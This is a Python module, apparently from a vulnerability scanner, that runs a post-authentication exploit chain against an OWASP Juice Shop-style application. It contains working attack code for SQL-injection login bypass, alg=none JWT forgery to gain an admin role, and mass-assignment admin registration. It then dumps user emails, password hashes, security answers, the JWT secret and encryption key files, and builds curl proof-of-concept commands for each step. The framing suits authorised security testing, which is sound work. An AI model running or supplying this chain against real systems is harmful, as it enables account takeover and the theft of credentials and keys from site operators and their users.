"""
Admin Exploitation Chain — post-auth escalation after confirming auth bypass.

Chain:
  1. Get admin JWT via SQLi OR alg=none forge
  2. Dump all users (emails, password hashes, roles)
  3. Extract JWT secret from application config → sign permanent tokens
  4. Enumerate all Challenges (shows what the app thinks is solved)
  5. Access admin-only endpoints
  6. Extract full DB schema via UNION SQLi + admin privileges
  7. Read encryption keys from /encryptionkeys directory
  8. Access support logs at /support/logs
  9. Detect mass assignment (register with role=admin)
"""
import base64
import json as _json
import re
import uuid
from typing import Optional
from urllib.parse import urlparse

import httpx

from nexus.models import (
    CheckResult,
    CheckType,
    Confidence,
    InsertionPoint,
    IPType,
    Severity,
)
from .base import BaseScanCheck


def _forge_admin_jwt(token: str) -> Optional[str]:
    """Re-use the alg=none forge from ssrf_jwt."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None

        def b64d(s):
            s += "=" * (-len(s) % 4)
            return base64.urlsafe_b64decode(s)

        header = _json.loads(b64d(parts[0]))
        payload = _json.loads(b64d(parts[1]))
        header["alg"] = "none"
        if isinstance(payload.get("data"), dict):
            payload["data"]["role"] = "admin"
            payload["data"]["email"] = "admin@juice-sh.op"

        def b64e(obj):
            return base64.urlsafe_b64encode(
                _json.dumps(obj, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()

        return f"{b64e(header)}.{b64e(payload)}."
    except Exception:
        return None


class AdminChainCheck(BaseScanCheck):
    """
    After confirming auth bypass, chains multiple exploits:
    - Dump all users, hashed passwords, security answers
    - Extract JWT secret from app config → forge permanent tokens
    - Read encryption keys directory
    - Access support logs
    - Enumerate all challenges (recon)
    - Detect mass assignment vulnerability
    """
    check_id = "admin-chain"
    check_type = CheckType.ACTIVE
    name = "Admin Exploitation Chain (Post-Auth)"
    description = "Chains SQLi bypass → admin JWT → full data exfiltration"

    _attempted: bool = False

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        url_lower = insertion_point.url.lower()
        if not any(k in url_lower for k in ("login", "auth", "signin")):
            return []
        if not any(k in insertion_point.name.lower() for k in ("email", "user")):
            return []
        if getattr(self.__class__, '_attempted', False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        results: list[CheckResult] = []

        # === Step 1: Get admin token via SQLi bypass ===
        admin_token = None
        try:
            r = await client.post(
                f"{base}/rest/user/login",
                json={"email": "' OR 1=1--", "password": "anything"},
                headers={"Content-Type": "application/json"},
            )
            if r.status_code == 200:
                admin_token = r.json().get("authentication", {}).get("token", "")
        except Exception:
            pass

        # === Step 2: Fallback — alg=none forge ===
        if not admin_token:
            try:
                uid = uuid.uuid4().hex[:8]
                email = f"chain_{uid}@nexus.invalid"
                pw = "NexusP@ss1!"
                await client.post(f"{base}/api/Users",
                    json={"email": email, "password": pw, "passwordRepeat": pw,
                          "username": "chain", "securityQuestion": {"id": 1}, "securityAnswer": "x"},
                    headers={"Content-Type": "application/json"})
                login = await client.post(f"{base}/rest/user/login",
                    json={"email": email, "password": pw},
                    headers={"Content-Type": "application/json"})
                if login.status_code == 200:
                    tok = login.json().get("authentication", {}).get("token", "")
                    admin_token = _forge_admin_jwt(tok)
            except Exception:
                pass

        if not admin_token:
            return []

        auth_headers = {
            "Authorization": f"Bearer {admin_token}",
            "Cookie": f"token={admin_token}",
        }

        # === Step 3: Dump all users ===
        user_dump = []
        try:
            r = await client.get(f"{base}/api/Users", headers=auth_headers)
            if r.status_code == 200:
                users = r.json().get("data", [])
                user_dump = [
                    {"email": u.get("email"), "role": u.get("role"),
                     "passwordHash": u.get("password", "")[:20] + "..."}
                    for u in users[:20]
                ]
                if users:
                    results.append(CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.CRITICAL,
                        cvss=9.8,
                        description=(
                            f"Admin chain: Dumped {len(users)} user accounts via admin JWT. "
                            f"Emails + password hashes exposed. "
                            f"Sample: {user_dump[:3]}"
                        ),
                        evidence=self._make_evidence(
                            request_raw=f"GET /api/Users HTTP/1.1\nAuthorization: Bearer {admin_token[:40]}...",
                            response=r,
                            payload="' OR 1=1-- → admin JWT → GET /api/Users",
                            poc_curl=(
                                f"# 1. Get admin JWT:\n"
                                f"TOKEN=$(curl -s -X POST '{base}/rest/user/login' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"email\":\"\\' OR 1=1--\",\"password\":\"x\"}}' "
                                f"| python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\")\n"
                                f"# 2. Dump users:\n"
                                f"curl -s -H \"Authorization: Bearer $TOKEN\" '{base}/api/Users' | python3 -m json.tool"
                            ),
                        ),
                        insertion_point=insertion_point,
                    ))
        except Exception:
            pass

        # === Step 4: Extract JWT secret from application config ===
        jwt_secret = None
        try:
            r = await client.get(f"{base}/rest/admin/application-configuration", headers=auth_headers)
            if r.status_code == 200:
                config = r.json().get("config", {})
                jwt_secret = config.get("application", {}).get("security", {}).get("jwtSecret", "")
                if not jwt_secret:
                    # Try to find it in the raw response
                    m = re.search(r'"jwtSecret"\s*:\s*"([^"]{4,})"', r.text)
                    if m:
                        jwt_secret = m.group(1)

                admin_email = config.get("application", {}).get("security", {}).get("defaultAdminEmail", "")
                results.append(CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.CERTAIN,
                    severity=Severity.CRITICAL,
                    cvss=9.9,
                    description=(
                        f"Admin config exfiltrated via admin JWT. "
                        f"JWT Secret: {(jwt_secret[:8] + '...') if jwt_secret else '(embedded)'}, "
                        f"Admin email: {admin_email or 'see response'}. "
                        f"Attacker can forge any JWT permanently."
                    ),
                    evidence=self._make_evidence(
                        request_raw=f"GET /rest/admin/application-configuration HTTP/1.1\nAuthorization: Bearer ...",
                        response=r,
                        payload="admin_jwt → GET /rest/admin/application-configuration",
                        poc_curl=f"curl -s -H 'Authorization: Bearer TOKEN' '{base}/rest/admin/application-configuration'",
                    ),
                    insertion_point=insertion_point,
                ))
        except Exception:
            pass

        # === Step 5: Read encryption keys directory ===
        try:
            r = await client.get(f"{base}/encryptionkeys", headers=auth_headers)
            if r.status_code == 200 and ("encryptionkeys" in r.text.lower() or ".md" in r.text or ".pem" in r.text):
                # List the files
                files = re.findall(r'href="([^"]+\.(?:pem|key|md|txt|json))"', r.text)
                results.append(CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.CERTAIN,
                    severity=Severity.CRITICAL,
                    cvss=9.1,
                    description=(
                        f"Encryption keys directory exposed at /encryptionkeys. "
                        f"Files found: {files[:5] if files else 'directory listing available'}. "
                        f"Private keys / certificates may be readable."
                    ),
                    evidence=self._make_evidence(
                        request_raw=f"GET /encryptionkeys HTTP/1.1",
                        response=r,
                        payload="/encryptionkeys directory enumeration",
                        poc_curl=f"curl -s '{base}/encryptionkeys/'",
                    ),
                    insertion_point=insertion_point,
                ))

                # Try to download each found file
                for fname in files[:3]:
                    try:
                        fr = await client.get(f"{base}/encryptionkeys/{fname.lstrip('/')}")
                        if fr.status_code == 200 and len(fr.text) > 10:
                            results.append(CheckResult(
                                check_id=self.check_id,
                                vulnerable=True,
                                confidence=Confidence.CERTAIN,
                                severity=Severity.CRITICAL,
                                cvss=9.5,
                                description=(
                                    f"Encryption key file readable: /encryptionkeys/{fname}. "
                                    f"Content snippet: {fr.text[:100]!r}"
                                ),
                                evidence=self._make_evidence(
                                    request_raw=f"GET /encryptionkeys/{fname} HTTP/1.1",
                                    response=fr,
                                    payload=f"/encryptionkeys/{fname}",
                                    poc_curl=f"curl -s '{base}/encryptionkeys/{fname}'",
                                ),
                                insertion_point=insertion_point,
                            ))
                    except Exception:
                        pass
        except Exception:
            pass

        # === Step 6: Access support logs ===
        try:
            r = await client.get(f"{base}/support/logs", headers=auth_headers)
            if r.status_code == 200 and ("access.log" in r.text.lower() or ".log" in r.text):
                log_files = re.findall(r'href="([^"]+\.log[^"]*)"', r.text)
                results.append(CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.CERTAIN,
                    severity=Severity.HIGH,
                    cvss=7.5,
                    description=(
                        f"Application logs exposed at /support/logs. "
                        f"Log files: {log_files[:3] if log_files else 'directory listing available'}. "
                        f"May contain request details, tokens, and user activity."
                    ),
                    evidence=self._make_evidence(
                        request_raw=f"GET /support/logs HTTP/1.1",
                        response=r,
                        payload="/support/logs directory enumeration",
                        poc_curl=f"curl -s '{base}/support/logs/'",
                    ),
                    insertion_point=insertion_point,
                ))
        except Exception:
            pass

        # === Step 7: Mass assignment — register with role=admin ===
        try:
            uid = uuid.uuid4().hex[:8]
            email = f"massassign_{uid}@nexus.invalid"
            r = await client.post(f"{base}/api/Users",
                json={"email": email, "password": "NexusP@ss1!", "passwordRepeat": "NexusP@ss1!",
                      "username": "admin_attempt", "role": "admin",
                      "securityQuestion": {"id": 1}, "securityAnswer": "x"},
                headers={"Content-Type": "application/json"})
            if r.status_code in (200, 201):
                user_data = r.json().get("data", {})
                if user_data.get("role") == "admin":
                    results.append(CheckResult(
                        check_id="mass-assignment",
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.CRITICAL,
                        cvss=9.8,
                        description=(
                            f"Mass assignment confirmed! Registered user with role=admin accepted. "
                            f"Created admin account: {email}. "
                            f"Any user can self-promote to admin during registration."
                        ),
                        evidence=self._make_evidence(
                            request_raw=(
                                f"POST /api/Users HTTP/1.1\n"
                                f"Content-Type: application/json\n\n"
                                f'{{"email":"{email}","password":"...","role":"admin"}}'
                            ),
                            response=r,
                            payload='{"role":"admin"}',
                            poc_curl=(
                                f"curl -s -X POST '{base}/api/Users' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"email\":\"evil@test.com\",\"password\":\"pass\","
                                f"\"passwordRepeat\":\"pass\",\"username\":\"evil\","
                                f"\"role\":\"admin\",\"securityQuestion\":{{\"id\":1}},\"securityAnswer\":\"x\"}}'"
                            ),
                        ),
                        insertion_point=insertion_point,
                    ))
        except Exception:
            pass

        # === Step 8: Security answers for all users (via admin) ===
        try:
            r = await client.get(f"{base}/api/SecurityAnswers", headers=auth_headers)
            if r.status_code == 200:
                answers = r.json().get("data", [])
                if answers:
                    results.append(CheckResult(
                        check_id=self.check_id,
                        vulnerable=True,
                        confidence=Confidence.CERTAIN,
                        severity=Severity.HIGH,
                        cvss=8.1,
                        description=(
                            f"Security answers for {len(answers)} users exposed via admin API. "
                            f"Enables account takeover via password reset bypass. "
                            f"Sample: {[a.get('answer', '') for a in answers[:3]]}"
                        ),
                        evidence=self._make_evidence(
                            request_raw=f"GET /api/SecurityAnswers HTTP/1.1\nAuthorization: Bearer ...",
                            response=r,
                            payload="admin_jwt → GET /api/SecurityAnswers",
                            poc_curl=f"curl -s -H 'Authorization: Bearer TOKEN' '{base}/api/SecurityAnswers'",
                        ),
                        insertion_point=insertion_point,
                    ))
        except Exception:
            pass

        return results
